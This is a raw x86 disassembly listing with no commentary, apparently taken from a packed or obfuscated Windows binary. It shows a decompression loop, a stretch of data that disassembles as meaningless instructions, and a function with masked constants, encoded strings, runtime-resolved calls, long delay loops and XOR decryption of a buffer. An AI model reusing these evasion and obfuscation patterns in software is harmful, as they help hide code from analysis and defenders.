  42006a:	mov    esi,0x100
  42006f:	jne    0x42007f
  420071:	cmp    eax,esi
  420073:	jb     0x42004c
  420075:	jmp    0x42008b
  420077:	mov    ebp,DWORD PTR [ebp-0x34]
  42007a:	call   0x420310
  42007f:	inc    eax
  420080:	inc    esi
  420081:	sub    eax,0x1
  420084:	sub    esi,0x1
  420087:	cmp    eax,esi
  420089:	jb     0x420077
  42008b:	pop    edx
  42008c:	inc    edx
  42008d:	cmp    edx,0x5
  420090:	dec    edx
  420091:	mov    ecx,edx
  420093:	jb     0x4200a4
  420095:	inc    edx
  420096:	cmp    edx,0xb
  420099:	dec    edx
  42009a:	mov    cl,0x4
  42009c:	dec    cl
  42009e:	jb     0x4200a4
  4200a0:	mov    cl,0x7
  4200a2:	dec    cl
  4200a4:	sub    edx,ecx
  4200a6:	push   edx
  4200a7:	jmp    0x4200f8
  4200a9:	mov    al,0xc1
  4200ab:	dec    al
  4200ad:	call   0x420301
  4200b2:	jne    0x4200c8
  4200b4:	pop    eax
  4200b5:	pop    edi
  4200b6:	pop    edx
  4200b7:	pop    ecx
  4200b8:	pop    edx
  4200b9:	pop    ecx
  4200ba:	push   DWORD PTR [esp]
  4200bd:	push   ecx
  4200be:	push   edx
  4200bf:	mov    edx,0x664
  4200c4:	mov    cl,0x0
  4200c6:	jmp    0x42013b
  4200c8:	mov    al,0xcd
  4200ca:	dec    al
  4200cc:	call   0x420301
  4200d1:	jne    0x420101
  4200d3:	mov    al,0xf1
  4200d5:	dec    al
  4200d7:	call   0x4202f1
  4200dc:	jne    0x420131
  4200de:	pop    eax
  4200df:	cmp    al,0x7
  4200e1:	mov    al,0x9
  4200e3:	jb     0x4200e7
  4200e5:	mov    al,0xb
  4200e7:	push   eax
  4200e8:	mov    esi,DWORD PTR [ebp-0x4]
  4200eb:	sub    esi,DWORD PTR [ebp-0x24]
  4200ee:	cmp    esi,DWORD PTR [ebp+0x24]
  4200f1:	jb     0x4202c8
  4200f7:	lods   al,BYTE PTR ds:[esi]
  4200f8:	mov    edi,DWORD PTR [ebp-0x4]
  4200fb:	stos   BYTE PTR es:[edi],al
  4200fc:	jmp    0x42028f
  420101:	mov    al,0xd8
  420103:	call   0x420301
  420108:	mov    esi,DWORD PTR [ebp-0x28]
  42010b:	je     0x420128
  42010d:	mov    al,0xe4
  42010f:	call   0x420301
  420114:	mov    esi,DWORD PTR [ebp-0x2c]
  420117:	je     0x420122
  420119:	mov    esi,DWORD PTR [ebp-0x30]
  42011c:	mov    ecx,DWORD PTR [ebp-0x2c]
  42011f:	mov    DWORD PTR [ebp-0x30],ecx
  420122:	mov    ecx,DWORD PTR [ebp-0x28]
  420125:	mov    DWORD PTR [ebp-0x2c],ecx
  420128:	mov    ecx,DWORD PTR [ebp-0x24]
  42012b:	mov    DWORD PTR [ebp-0x28],ecx
  42012e:	mov    DWORD PTR [ebp-0x24],esi
  420131:	pop    eax
  420132:	pop    edi
  420133:	pop    ecx
  420134:	mov    edx,0xa68
  420139:	mov    cl,0x8
  42013b:	add    edx,edi
  42013d:	push   edx
  42013e:	push   edi
  42013f:	cmp    al,0x7
  420141:	mov    al,cl
  420143:	jb     0x420147
  420145:	add    al,0x3
  420147:	push   eax
  420148:	mov    ebp,DWORD PTR [ebp-0x34]
  42014b:	call   0x42030e
  420150:	jne    0x420166
  420152:	mov    eax,DWORD PTR [ebp-0x18]
  420155:	mov    edi,DWORD PTR [ebp-0x34]
  420158:	shl    eax,0x3
  42015b:	sub    ecx,ecx
  42015d:	push   0x8
  42015f:	pop    esi
  420160:	lea    edi,[edi+eax*2+0x4]
  420164:	jmp    0x42019b
  420166:	mov    ebp,DWORD PTR [ebp-0x34]
  420169:	add    ebp,0x2
  42016c:	call   0x42030e
  420171:	jne    0x42018b
  420173:	mov    eax,DWORD PTR [ebp-0x18]
  420176:	mov    edi,DWORD PTR [ebp-0x34]
  420179:	shl    eax,0x3
  42017c:	push   0x8
  42017e:	pop    ecx
  42017f:	push   0x8
  420181:	pop    esi
  420182:	lea    edi,[edi+eax*2+0x104]
  420189:	jmp    0x42019b
  42018b:	mov    edi,0x204
  420190:	add    edi,DWORD PTR [ebp-0x34]
  420193:	push   0x10
  420195:	pop    ecx
  420196:	mov    esi,0x100
  42019b:	mov    DWORD PTR [ebp-0x1c],ecx
  42019e:	sub    eax,eax
  4201a0:	inc    eax
  4201a1:	mov    ebp,edi
  4201a3:	call   0x420310
  4201a8:	mov    ecx,eax
  4201aa:	sub    ecx,esi
  4201ac:	jb     0x4201a1
  4201ae:	add    DWORD PTR [ebp-0x1c],ecx
  4201b1:	cmp    DWORD PTR [ebp-0x3c],0x4
  4201b5:	jae    0x42026b
  4201bb:	add    DWORD PTR [ebp-0x3c],0x7
  4201bf:	mov    ecx,DWORD PTR [ebp-0x1c]
  4201c2:	cmp    ecx,0x4
  4201c5:	jb     0x4201ca
  4201c7:	push   0x3
  4201c9:	pop    ecx
  4201ca:	mov    edi,DWORD PTR [ebp-0x38]
  4201cd:	shl    ecx,0x6
  4201d0:	sub    eax,eax
  4201d2:	inc    eax
  4201d3:	push   0x40
  4201d5:	pop    esi
  4201d6:	lea    edi,[edi+ecx*2+0x360]
  4201dd:	mov    ebp,edi
  4201df:	call   0x420310
  4201e4:	mov    ecx,eax
  4201e6:	sub    ecx,esi
  4201e8:	jb     0x4201dd
  4201ea:	mov    DWORD PTR [ebp-0x18],ecx
  4201ed:	mov    DWORD PTR [ebp-0x24],ecx
  4201f0:	cmp    ecx,0x4
  4201f3:	jb     0x420268
  4201f5:	mov    esi,ecx
  4201f7:	and    DWORD PTR [ebp-0x24],0x1
  4201fb:	shr    esi,1
  4201fd:	or     DWORD PTR [ebp-0x24],0x2
  420201:	dec    esi
  420202:	cmp    ecx,0xe
  420205:	jae    0x420220
  420207:	mov    eax,0x2af
  42020c:	sub    eax,ecx
  42020e:	mov    ecx,esi
  420210:	shl    BYTE PTR [ebp-0x24],cl
  420213:	add    eax,DWORD PTR [ebp-0x24]
  420216:	shl    eax,1
  420218:	add    eax,DWORD PTR [ebp-0x38]
  42021b:	mov    DWORD PTR [ebp-0x34],eax
  42021e:	jmp    0x42024d
  420220:	sub    esi,0x4
  420223:	call   0x4202cd
  420228:	shr    ebx,1
  42022a:	shl    DWORD PTR [ebp-0x24],1
  42022d:	cmp    DWORD PTR [ebp-0x20],ebx
  420230:	jb     0x420238
  420232:	inc    DWORD PTR [ebp-0x24]
  420235:	sub    DWORD PTR [ebp-0x20],ebx
  420238:	dec    esi
  420239:	jne    0x420223
  42023b:	mov    eax,0x644
  420240:	add    eax,DWORD PTR [ebp-0x38]
  420243:	mov    DWORD PTR [ebp-0x34],eax
  420246:	shl    DWORD PTR [ebp-0x24],0x4
  42024a:	push   0x4
  42024c:	pop    esi
  42024d:	sub    edi,edi
  42024f:	inc    edi
  420250:	mov    eax,edi
  420252:	mov    ebp,DWORD PTR [ebp-0x34]
  420255:	call   0x420310
  42025a:	test   al,0x1
  42025c:	je     0x420261
  42025e:	or     DWORD PTR [ebp-0x24],edi
  420261:	shl    edi,1
  420263:	dec    esi
  420264:	jne    0x420252
  420266:	jmp    0x420268
  420268:	inc    DWORD PTR [ebp-0x24]
  42026b:	mov    ecx,DWORD PTR [ebp-0x1c]
  42026e:	add    ecx,0x2
  420271:	mov    edi,DWORD PTR [ebp-0x4]
  420274:	mov    eax,edi
  420276:	sub    eax,DWORD PTR [ebp+0x24]
  420279:	cmp    DWORD PTR [ebp-0x24],eax
  42027c:	ja     0x4202c8
  42027e:	mov    esi,edi
  420280:	sub    esi,DWORD PTR [ebp-0x24]
  420283:	mov    edx,DWORD PTR [ebp+0x28]
  420286:	lods   al,BYTE PTR ds:[esi]
  420287:	stos   BYTE PTR es:[edi],al
  420288:	cmp    edi,edx
  42028a:	jae    0x42028f
  42028c:	dec    ecx
  42028d:	jne    0x420286
  42028f:	mov    DWORD PTR [ebp-0x4],edi
  420292:	movzx  esi,al
  420295:	cmp    edi,DWORD PTR [ebp+0x28]
  420298:	jb     0x41fff9
  42029e:	call   0x4202cd
  4202a3:	sub    eax,eax
  4202a5:	lea    ebp,[esp+0x3c]
  4202a9:	mov    edx,DWORD PTR [ebp+0x20]
  4202ac:	mov    esi,DWORD PTR [ebp-0x8]
  4202af:	sub    esi,DWORD PTR [ebp+0x18]
  4202b2:	mov    DWORD PTR [edx],esi
  4202b4:	mov    edx,DWORD PTR [ebp+0x2c]
  4202b7:	mov    edi,DWORD PTR [ebp-0x4]
  4202ba:	sub    edi,DWORD PTR [ebp+0x24]
  4202bd:	mov    DWORD PTR [edx],edi
  4202bf:	leave  
  4202c0:	pop    ebx
  4202c1:	pop    esi
  4202c2:	pop    edi
  4202c3:	ret    0x1c
  4202c6:	pop    esi
  4202c7:	pop    eax
  4202c8:	sub    eax,eax
  4202ca:	inc    eax
  4202cb:	jmp    0x4202a5
  4202cd:	cmp    ebx,0x1000000
  4202d3:	jb     0x4202d6
  4202d5:	ret    
  4202d6:	shl    ebx,0x8
  4202d9:	push   esi
  4202da:	mov    esi,DWORD PTR [ebp-0x8]
  4202dd:	cmp    esi,DWORD PTR [ebp+0x1c]
  4202e0:	jae    0x4202c6
  4202e2:	mov    ecx,0xe920ea0
  4202e7:	stos   DWORD PTR es:[edi],eax
  4202e8:	cmp    eax,0xb10ea0b1
  4202ed:	pusha  
  4202ee:	outs   dx,BYTE PTR ds:[esi]
  4202ef:	add    al,0x9a
  4202f1:	mov    ecx,0x65c79ec0
  4202f6:	mov    ss,WORD PTR [edx-0x5f6864ee]
  4202fc:	cs xchg edi,eax
  4202fe:	xchg   edx,eax
  4202ff:	cmp    ah,BYTE PTR [ebx-0x68719a39]
  420305:	mov    al,ds:0xae40b99e
  42030a:	sar    DWORD PTR [eax+eiz*4],0x8b
  42030e:	aaa    
  42030f:	mov    es,ecx
  420311:	cmp    al,0xa0
  420313:	mov    edx,DWORD PTR [ecx-0x74747486]
  420319:	(bad)  
  42031a:	pop    eax
  42031b:	sti    
  42031c:	mov    ecx,0x926b1bbc
  420321:	sbb    al,0x1b
  420323:	or     ebp,DWORD PTR [ebx-0x3e44389]
  420329:	pop    eax
  42032a:	std    
  42032b:	mov    ch,0xcf
  42032d:	mov    bl,BYTE PTR [ebx+ebx*1-0x54e56d95]
  420334:	lods   eax,DWORD PTR ds:[esi]
  420335:	fcomp  QWORD PTR [ebx]
  420337:	or     edi,DWORD PTR [ecx-0x1f963846]
  42033d:	mov    edx,DWORD PTR [edx+0x49c7b732]
  420343:	mov    dh,0x6f
  420345:	mov    esp,0xe7580b1b
  42034a:	mov    ecx,0xab8b71f2
  42034f:	mov    ecx,DWORD PTR [ebx+0x3292b637]
  420355:	lahf   
  420356:	and    al,0x8f
  420358:	ror    BYTE PTR [ebx+0x3cc18e97],0x1b
  42035f:	mov    WORD PTR [edx+0x29053692],ds
  420365:	dec    esp
  420366:	and    al,0x20
  420368:	sub    ebx,ecx
  42036a:	sub    WORD PTR [ebp+0x0],dx
  42036e:	add    eax,eax
  420370:	add    eax,0x1
  420373:	lea    ebp,[esp+0x40]
  420377:	ret    
  420378:	push   ebp
  420379:	mov    ebp,esp
  42037b:	sub    esp,0x12c
  420381:	push   ebx
  420382:	push   esi
  420383:	push   edi
  420384:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42038b:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  420392:	mov    eax,DWORD PTR [ebp+0x8]
  420395:	mov    DWORD PTR [ebp+0x8],eax
  420398:	mov    ecx,DWORD PTR [ebp-0x10]
  42039b:	mov    ebx,0x75108b3
  4203a0:	xor    ecx,ebx
  4203a2:	mov    eax,0x3272fa
  4203a7:	add    ecx,eax
  4203a9:	mov    DWORD PTR [ebp-0x2c],ecx
  4203ac:	mov    ecx,DWORD PTR [ebp-0x10]
  4203af:	xor    ecx,ebx
  4203b1:	add    ecx,eax
  4203b3:	mov    DWORD PTR [ebp-0x3c],ecx
  4203b6:	mov    ecx,DWORD PTR [ebp-0x10]
  4203b9:	xor    ecx,ebx
  4203bb:	add    ecx,eax
  4203bd:	mov    DWORD PTR [ebp-0x40],ecx
  4203c0:	mov    ecx,DWORD PTR [ebp-0x10]
  4203c3:	xor    ecx,ebx
  4203c5:	add    ecx,eax
  4203c7:	mov    DWORD PTR [ebp-0xd8],ecx
  4203cd:	mov    DWORD PTR [ebp-0x50],0xf89f05b5
  4203d4:	mov    DWORD PTR [ebp-0x40],0xf89cb5b5
  4203db:	mov    DWORD PTR [ebp-0x54],0xf89c85b9
  4203e2:	push   0x25
  4203e4:	pop    ecx
  4203e5:	mov    DWORD PTR [ebp-0x38],ecx
  4203e8:	mov    DWORD PTR [ebp-0x38],ecx
  4203eb:	push   0x65
  4203ed:	pop    ecx
  4203ee:	mov    DWORD PTR [ebp-0x38],ecx
  4203f1:	mov    DWORD PTR [ebp-0x38],ecx
  4203f4:	mov    DWORD PTR [ebp-0x38],0x4d
  4203fb:	mov    DWORD PTR [ebp-0x38],0x43
  420402:	mov    ecx,DWORD PTR [ebp-0x10]
  420405:	xor    ecx,ebx
  420407:	add    ecx,eax
  420409:	mov    DWORD PTR [ebp-0x38],ecx
  42040c:	mov    ecx,DWORD PTR [ebp-0x10]
  42040f:	xor    ecx,ebx
  420411:	add    ecx,eax
  420413:	mov    DWORD PTR [ebp-0x38],ecx
  420416:	mov    DWORD PTR [ebp-0x28],0x258
  42041d:	mov    DWORD PTR [ebp-0x20],0x36
  420424:	mov    DWORD PTR [ebp-0x14],0x7a
  42042b:	lea    edi,[ebp-0x10c]
  420431:	lea    esi,[ebp-0x12c]
  420437:	call   0x4210f9
  42043c:	dec    DWORD PTR [ebp-0x14]
  42043f:	jne    0x42042b
  420441:	dec    DWORD PTR [ebp-0x20]
  420444:	jne    0x420424
  420446:	dec    DWORD PTR [ebp-0x28]
  420449:	jne    0x42041d
  42044b:	mov    DWORD PTR [ebp-0x28],0x400e
  420452:	mov    eax,DWORD PTR [ebp-0x10]
  420455:	xor    eax,ebx
  420457:	mov    esi,0x3272fa
  42045c:	add    eax,esi
  42045e:	mov    DWORD PTR [ebp-0x1c],eax
  420461:	mov    eax,DWORD PTR [ebp-0x10]
  420464:	and    DWORD PTR [ebp-0x94],0x0
  42046b:	xor    eax,ebx
  42046d:	add    eax,esi
  42046f:	mov    DWORD PTR [ebp-0x34],eax
  420472:	mov    eax,fs:0x18
  420478:	mov    DWORD PTR [ebp-0x94],eax
  42047e:	mov    eax,DWORD PTR [eax+0x30]
  420481:	mov    DWORD PTR [ebp-0xcc],eax
  420487:	mov    eax,DWORD PTR [eax+0xc]
  42048a:	mov    DWORD PTR [ebp-0xc0],eax
  420490:	mov    eax,DWORD PTR [ebp+0x8]
  420493:	lea    ecx,[ebp-0x94]
  420499:	mov    DWORD PTR [eax+0x1a0],ecx
  42049f:	mov    eax,DWORD PTR [ebp+0x8]
  4204a2:	lea    ecx,[ebp-0xcc]
  4204a8:	mov    DWORD PTR [eax+0x1a4],ecx
  4204ae:	mov    eax,DWORD PTR [ebp+0x8]
  4204b1:	push   DWORD PTR [ebp+0x8]
  4204b4:	lea    ecx,[ebp-0xc0]
  4204ba:	mov    DWORD PTR [eax+0x1a8],ecx
  4204c0:	call   0x4228ba
  4204c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4204c8:	xor    ecx,ebx
  4204ca:	add    ecx,esi
  4204cc:	cmp    ecx,eax
  4204ce:	je     0x420851
  4204d4:	mov    eax,DWORD PTR [ebp+0x8]
  4204d7:	mov    eax,DWORD PTR [eax+0x194]
  4204dd:	mov    ecx,DWORD PTR [eax]
  4204df:	mov    eax,DWORD PTR [ebp+0x8]
  4204e2:	mov    eax,DWORD PTR [eax+0x194]
  4204e8:	mov    eax,DWORD PTR [eax]
  4204ea:	add    eax,DWORD PTR [ecx+0x3c]
  4204ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4204f0:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4204f6:	lea    edx,[ebp-0xec]
  4204fc:	push   edx
  4204fd:	mov    edx,DWORD PTR [ebp+0x8]
  420500:	mov    edx,DWORD PTR [edx+0x18c]
  420506:	mov    edx,DWORD PTR [edx]
  420508:	add    edx,DWORD PTR [eax+0x88]
  42050e:	push   0x4
  420510:	push   DWORD PTR [eax+0x8c]
  420516:	push   edx
  420517:	call   DWORD PTR [ecx+0x1c]
  42051a:	push   DWORD PTR [ebp+0x8]
  42051d:	xor    eax,eax
  42051f:	mov    DWORD PTR [ebp-0xa8],0xe3bcecc2
  420529:	mov    DWORD PTR [ebp-0xa4],0xe8c7edda
  420533:	mov    DWORD PTR [ebp-0xa0],0xbaeddef0
  42053d:	mov    BYTE PTR [ebp-0x9c],0x7b
  420544:	lea    edi,[ebp-0x9b]
  42054a:	stos   DWORD PTR es:[edi],eax
  42054b:	stos   WORD PTR es:[edi],ax
  42054d:	stos   BYTE PTR es:[edi],al
  42054e:	xor    eax,eax
  420550:	mov    DWORD PTR [ebp-0xbc],0xe3bcecc2
  42055a:	mov    DWORD PTR [ebp-0xb8],0xe8c7edda
  420564:	mov    DWORD PTR [ebp-0xb4],0xd0eddef0
  42056e:	mov    BYTE PTR [ebp-0xb0],0x7b
  420575:	lea    edi,[ebp-0xaf]
  42057b:	stos   DWORD PTR es:[edi],eax
  42057c:	stos   WORD PTR es:[edi],ax
  42057e:	stos   BYTE PTR es:[edi],al
  42057f:	mov    edi,DWORD PTR [ebp+0x8]
  420582:	mov    eax,DWORD PTR [ebp+0x8]
  420585:	mov    edx,DWORD PTR [eax+0x1b8]
  42058b:	mov    DWORD PTR [ebp-0x68],0xedefece7
  420592:	mov    DWORD PTR [ebp-0x64],0xe2ebe6dc
  420599:	mov    WORD PTR [ebp-0x60],0x7bba
  42059f:	mov    DWORD PTR [ebp-0x90],0xe3bcecc2
  4205a9:	mov    DWORD PTR [ebp-0x8c],0xe7baedda
  4205b3:	mov    DWORD PTR [ebp-0x88],0xc9dae3eb
  4205bd:	mov    DWORD PTR [ebp-0x84],0xeddee6ee
  4205c7:	mov    DWORD PTR [ebp-0x80],0x7bbadce2
  4205ce:	mov    DWORD PTR [ebp-0x7c],0xe3bcecc2
  4205d5:	mov    DWORD PTR [ebp-0x78],0xe7baedda
  4205dc:	mov    DWORD PTR [ebp-0x74],0xc9dae3eb
  4205e3:	mov    DWORD PTR [ebp-0x70],0xeddee6ee
  4205ea:	mov    DWORD PTR [ebp-0x6c],0x7bd0dce2
  4205f1:	call   0x4228e9
  4205f6:	push   eax
  4205f7:	mov    eax,DWORD PTR [ebp+0x8]
  4205fa:	mov    eax,DWORD PTR [eax+0x1a8]
  420600:	push   DWORD PTR [eax]
  420602:	call   0x42258a
  420607:	test   eax,eax
  420609:	jne    0x42065b
  42060b:	mov    eax,DWORD PTR [ebp+0x8]
  42060e:	mov    eax,DWORD PTR [eax+0x1e0]
  420614:	mov    edi,DWORD PTR [ebp+0x8]
  420617:	add    eax,0x4
  42061a:	mov    DWORD PTR [ebp-0x24],eax
  42061d:	mov    eax,DWORD PTR [ebp+0x8]
  420620:	mov    edx,DWORD PTR [eax+0x1b8]
  420626:	call   0x4228e9
  42062b:	push   eax
  42062c:	mov    eax,DWORD PTR [ebp-0x24]
  42062f:	call   DWORD PTR [eax]
  420631:	test   eax,eax
  420633:	jne    0x42065b
  420635:	mov    eax,DWORD PTR [ebp+0x8]
  420638:	mov    eax,DWORD PTR [eax+0x1e0]
  42063e:	mov    edi,DWORD PTR [ebp+0x8]
  420641:	add    eax,0x10
  420644:	mov    DWORD PTR [ebp-0x24],eax
  420647:	mov    eax,DWORD PTR [ebp+0x8]
  42064a:	mov    edx,DWORD PTR [eax+0x1b8]
  420650:	call   0x4228e9
  420655:	push   eax
  420656:	mov    eax,DWORD PTR [ebp-0x24]
  420659:	call   DWORD PTR [eax]
  42065b:	mov    eax,DWORD PTR [ebp-0x10]
  42065e:	mov    ecx,DWORD PTR [ebp-0x28]
  420661:	xor    eax,ebx
  420663:	add    eax,esi
  420665:	cmp    eax,ecx
  420667:	je     0x42082a
  42066d:	mov    eax,DWORD PTR [ebp-0x18]
  420670:	xor    eax,ebx
  420672:	mov    ecx,0xffcd8d06
  420677:	sub    ecx,eax
  420679:	add    ecx,DWORD PTR [ebp-0x28]
  42067c:	mov    eax,DWORD PTR [ebp-0x1c]
  42067f:	cmp    eax,ecx
  420681:	ja     0x42082a
  420687:	mov    DWORD PTR [ebp-0x20],0x0
  42068e:	push   DWORD PTR [ebp+0x8]
  420691:	mov    edi,DWORD PTR [ebp+0x8]
  420694:	mov    eax,DWORD PTR [ebp+0x8]
  420697:	mov    edx,DWORD PTR [eax+0x1b4]
  42069d:	call   0x4228e9
  4206a2:	push   eax
  4206a3:	mov    eax,DWORD PTR [ebp+0x8]
  4206a6:	mov    eax,DWORD PTR [eax+0x1a8]
  4206ac:	push   DWORD PTR [eax]
  4206ae:	call   0x42258a
  4206b3:	mov    ecx,DWORD PTR [ebp+0x8]
  4206b6:	mov    ecx,DWORD PTR [ecx+0x19c]
  4206bc:	mov    DWORD PTR [ecx],eax
  4206be:	mov    eax,DWORD PTR [ebp+0x8]
  4206c1:	mov    edi,DWORD PTR [eax+0x1e0]
  4206c7:	mov    esi,DWORD PTR [ebp+0x8]
  4206ca:	xor    eax,eax
  4206cc:	lea    edx,[ebp-0x7c]
  4206cf:	call   0x42291f
  4206d4:	push   eax
  4206d5:	mov    eax,DWORD PTR [ebp+0x8]
  4206d8:	mov    eax,DWORD PTR [eax+0x19c]
  4206de:	push   DWORD PTR [eax]
  4206e0:	call   DWORD PTR [edi+0x8]
  4206e3:	mov    DWORD PTR [ebp-0x24],eax
  4206e6:	mov    eax,DWORD PTR [ebp+0x8]
  4206e9:	mov    edi,DWORD PTR [eax+0x1e0]
  4206ef:	mov    esi,DWORD PTR [ebp+0x8]
  4206f2:	xor    eax,eax
  4206f4:	lea    edx,[ebp-0x90]
  4206fa:	call   0x42291f
  4206ff:	push   eax
  420700:	mov    eax,DWORD PTR [ebp+0x8]
  420703:	mov    eax,DWORD PTR [eax+0x19c]
  420709:	push   DWORD PTR [eax]
  42070b:	call   DWORD PTR [edi+0x8]
  42070e:	mov    eax,DWORD PTR [ebp+0x8]
  420711:	mov    edi,DWORD PTR [eax+0x1e0]
  420717:	mov    esi,DWORD PTR [ebp+0x8]
  42071a:	xor    eax,eax
  42071c:	lea    edx,[ebp-0xa8]
  420722:	call   0x42291f
  420727:	push   eax
  420728:	mov    eax,DWORD PTR [ebp+0x8]
  42072b:	mov    eax,DWORD PTR [eax+0x19c]
  420731:	push   DWORD PTR [eax]
  420733:	call   DWORD PTR [edi+0x8]
  420736:	and    DWORD PTR [ebp-0x8],0x0
  42073a:	mov    DWORD PTR [ebp-0x44],eax
  42073d:	mov    eax,DWORD PTR [ebp-0x8]
  420740:	and    eax,0x7
  420743:	add    eax,0x31
  420746:	push   eax
  420747:	call   DWORD PTR [ebp-0x24]
  42074a:	test   eax,eax
  42074c:	je     0x420790
  42074e:	mov    eax,DWORD PTR [ebp-0x8]
  420751:	push   0x19
  420753:	xor    edx,edx
  420755:	pop    ecx
  420756:	div    ecx
  420758:	add    dl,0x41
  42075b:	movzx  eax,dl
  42075e:	push   eax
  42075f:	call   DWORD PTR [ebp-0x44]
  420762:	test   eax,eax
  420764:	jne    0x420790
  420766:	mov    eax,DWORD PTR [ebp+0x8]
  420769:	mov    edi,DWORD PTR [eax+0x1e0]
  42076f:	mov    esi,DWORD PTR [ebp+0x8]
  420772:	xor    eax,eax
  420774:	lea    edx,[ebp-0x68]
  420777:	call   0x42291f
  42077c:	push   eax
  42077d:	mov    eax,DWORD PTR [ebp+0x8]
  420780:	mov    eax,DWORD PTR [eax+0x198]
  420786:	push   DWORD PTR [eax]
  420788:	call   DWORD PTR [edi+0x8]
  42078b:	mov    DWORD PTR [ebp-0x14],eax
  42078e:	jmp    0x420794
  420790:	and    DWORD PTR [ebp-0x14],0x0
  420794:	inc    DWORD PTR [ebp-0x8]
  420797:	cmp    DWORD PTR [ebp-0x8],0x10
  42079b:	jb     0x42073d
  42079d:	mov    eax,DWORD PTR [ebp-0x18]
  4207a0:	mov    esi,DWORD PTR [ebp+0x8]
  4207a3:	xor    eax,ebx
  4207a5:	mov    edi,0x3272fa
  4207aa:	add    eax,edi
  4207ac:	lea    edx,[ebp-0x10c]
  4207b2:	call   0x42291f
  4207b7:	push   eax
  4207b8:	mov    eax,DWORD PTR [ebp-0x10]
  4207bb:	mov    esi,DWORD PTR [ebp+0x8]
  4207be:	xor    eax,ebx
  4207c0:	add    eax,edi
  4207c2:	lea    edx,[ebp-0x12c]
  4207c8:	call   0x42291f
  4207cd:	push   eax
  4207ce:	call   DWORD PTR [ebp-0x14]
  4207d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4207d4:	xor    ecx,ebx
  4207d6:	add    ecx,edi
  4207d8:	cmp    ecx,eax
  4207da:	jne    0x4207e3
  4207dc:	mov    DWORD PTR [ebp-0x20],0x1
  4207e3:	mov    eax,DWORD PTR [ebp-0x18]
  4207e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4207e9:	xor    eax,ebx
  4207eb:	lea    eax,[eax+ecx*1+0x3272fa]
  4207f2:	mov    DWORD PTR [ebp-0x1c],eax
  4207f5:	mov    eax,DWORD PTR [ebp-0x20]
  4207f8:	test   eax,eax
  4207fa:	je     0x42080e
  4207fc:	mov    eax,DWORD PTR [ebp-0x18]
  4207ff:	mov    ecx,DWORD PTR [ebp-0x34]
  420802:	xor    eax,ebx
  420804:	lea    eax,[eax+ecx*1+0x3272fa]
  42080b:	mov    DWORD PTR [ebp-0x34],eax
  42080e:	mov    eax,DWORD PTR [ebp-0x18]
  420811:	xor    eax,ebx
  420813:	mov    ecx,0xffcd8d06
  420818:	sub    ecx,eax
  42081a:	add    ecx,DWORD PTR [ebp-0x28]
  42081d:	mov    eax,DWORD PTR [ebp-0x1c]
  420820:	cmp    eax,ecx
  420822:	jbe    0x420687
  420828:	mov    esi,edi
  42082a:	mov    eax,DWORD PTR [ebp-0x34]
  42082d:	mov    ecx,DWORD PTR [ebp-0x1c]
  420830:	cmp    ecx,eax
  420832:	jne    0x420845
  420834:	push   DWORD PTR [ebp+0x8]
  420837:	lea    eax,[ebp-0x3c]
  42083a:	push   eax
  42083b:	call   0x42338e
  420840:	mov    DWORD PTR [ebp-0x2c],eax
  420843:	jmp    0x420851
  420845:	mov    eax,DWORD PTR [ebp-0x2c]
  420848:	mov    ecx,DWORD PTR [ebp-0x18]
  42084b:	xor    ecx,ebx
  42084d:	add    ecx,esi
  42084f:	xor    DWORD PTR [eax],ecx
  420851:	mov    eax,DWORD PTR [ebp-0x10]
  420854:	mov    ecx,DWORD PTR [ebp-0x2c]
  420857:	xor    eax,ebx
  420859:	add    eax,esi
  42085b:	cmp    eax,ecx
  42085d:	je     0x420fd7
  420863:	mov    eax,DWORD PTR [ebp-0x10]
  420866:	mov    ecx,DWORD PTR [ebp-0x3c]
  420869:	xor    eax,ebx
  42086b:	add    eax,esi
  42086d:	cmp    eax,ecx
  42086f:	je     0x420fd7
  420875:	mov    eax,DWORD PTR [ebp-0x10]
  420878:	xor    eax,ebx
  42087a:	add    eax,esi
  42087c:	jmp    0x42089a
  42087e:	mov    edi,DWORD PTR [ebp-0x2c]
  420881:	mov    cl,al
  420883:	and    cl,0x1f
  420886:	or     dl,0xff
  420889:	sub    dl,cl
  42088b:	add    BYTE PTR [edi+eax*1],dl
  42088e:	mov    ecx,DWORD PTR [ebp-0x18]
  420891:	xor    ecx,ebx
  420893:	lea    eax,[eax+ecx*1+0x3272fa]
  42089a:	mov    ecx,DWORD PTR [ebp-0x3c]
  42089d:	cmp    eax,ecx
  42089f:	jb     0x42087e
  4208a1:	mov    eax,DWORD PTR [ebp-0x3c]
  4208a4:	mov    DWORD PTR [ebp-0x28],eax
  4208a7:	mov    eax,DWORD PTR [ebp-0x2c]
  4208aa:	mov    DWORD PTR [ebp-0x34],0xf89c85b5
  4208b1:	mov    DWORD PTR [ebp-0xd4],eax
  4208b7:	mov    edi,0xf89c85b4
  4208bc:	mov    DWORD PTR [ebp-0x30],edi
  4208bf:	mov    eax,DWORD PTR [ebp-0x34]
  4208c2:	xor    eax,ebx
  4208c4:	add    eax,esi
  4208c6:	mov    DWORD PTR [ebp-0xc],eax
  4208c9:	mov    eax,DWORD PTR [ebp-0x34]
  4208cc:	xor    eax,ebx
  4208ce:	add    eax,esi
  4208d0:	mov    DWORD PTR [ebp-0x8],eax
  4208d3:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  4208da:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  4208e1:	mov    eax,DWORD PTR [ebp-0x34]
  4208e4:	mov    ecx,DWORD PTR [ebp-0x28]
  4208e7:	xor    eax,ebx
  4208e9:	add    eax,esi
  4208eb:	cmp    ecx,eax
  4208ed:	je     0x420aec
  4208f3:	jmp    0x420ac8
  4208f8:	mov    ecx,DWORD PTR [ebp-0xc]
  4208fb:	mov    eax,DWORD PTR [ebp-0x28]
  4208fe:	sub    eax,ecx
  420900:	mov    ecx,DWORD PTR [ebp-0x44]
  420903:	xor    ecx,ebx
  420905:	add    ecx,esi
  420907:	xor    edx,edx
  420909:	div    ecx
  42090b:	mov    DWORD PTR [ebp-0x8],eax
  42090e:	mov    eax,DWORD PTR [ebp-0x4c]
  420911:	mov    ecx,DWORD PTR [ebp-0x8]
  420914:	xor    eax,ebx
  420916:	add    eax,esi
  420918:	cmp    ecx,eax
  42091a:	jbe    0x420926
  42091c:	mov    eax,DWORD PTR [ebp-0x4c]
  42091f:	xor    eax,ebx
  420921:	add    eax,esi
